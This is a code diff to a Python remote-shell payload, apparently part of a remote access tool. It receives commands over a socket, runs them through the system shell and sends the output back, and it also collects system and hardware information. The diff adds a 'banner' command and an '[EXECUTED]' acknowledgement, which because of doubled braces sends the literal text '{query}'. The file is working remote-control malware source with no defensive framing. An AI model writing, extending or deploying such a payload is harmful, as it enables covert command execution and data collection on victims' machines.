@@ -17,7 +17,8 @@ def get_systeminfo():
 def custom_help():
     help_text="""
  COMMAND   DESCRIPTION
-
+ 
+ banner      Shows the tool banner
  sysinfo     Retrieve detailed system and hardware information.
  help        Show usage information and available options."""
     return help_text
@@ -58,13 +59,19 @@ class Payload:
             case 'sysinfo':
                 self.s.send(get_systeminfo().encode())
 
+            case 'banner':
+                self.s.send("\u00A0".encode())
             case 'help':
                 self.s.send(custom_help().encode())
 
             case _:
                 try:
                     result=sp.run(
-                        query, shell=True, capture_output=True, check=True)
+                        query, shell=True, check=True,
+                        capture_output=True)
+
+                    if not result.stdout.strip():
+                        self.s.send(f"[EXECUTED]: {{query}}".encode())
                     self.s.send(result.stdout.strip()) 
                 except sp.CalledProcessError as e:
                     self.s.send(e.stderr.strip())
